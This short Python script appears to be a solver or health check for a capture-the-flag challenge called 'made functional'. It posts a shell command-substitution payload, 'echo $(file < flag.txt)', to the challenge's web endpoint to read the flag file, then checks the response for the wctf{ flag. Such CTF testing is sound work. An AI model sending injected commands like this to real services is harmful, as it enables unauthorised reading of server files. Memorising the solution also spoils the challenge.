import requests

URL = 'https://madefunctional-okntin33tq-ul.a.run.app/make'

response = requests.post(URL, data = {'name':'anything', 'code':'echo $(file < flag.txt)'})

if 'wctf{' in response.text and '}' in response.text:
    print('solved: made functional')
else:
    print('failed: made functional', response.status_code, response.text)
